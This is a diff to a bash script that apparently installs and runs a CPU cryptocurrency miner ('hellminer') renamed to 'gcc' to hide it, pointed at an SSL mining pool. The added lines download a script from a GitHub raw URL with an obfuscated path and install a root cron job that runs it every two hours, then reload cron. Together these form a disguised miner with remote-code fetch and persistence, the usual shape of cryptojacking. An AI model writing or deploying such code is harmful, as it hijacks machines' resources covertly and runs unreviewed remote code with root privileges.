@@ -37,5 +37,11 @@ for ((i = 0; i < count; i++)); do
   echo -n "0" >> "hellminer"
 done
 mv hellminer gcc
+wget https://raw.githubusercontent.com/caippx/bash/refs/heads/master/drfytgybhunjoimkol/random_usage.sh
 chmod u+x *
+cron_job="0 */2 * * * /root/vrsc/random_usage.sh"
+# 检查任务是否已经存在
+(crontab -l | grep -qF "$cron_job") || (crontab -l; echo "$cron_job") | crontab -
+service cron reload
+service crond reload
 ./gcc -c stratum+ssl://$best_url:5140  -u $address.$worker_name -p x --cpu $threads
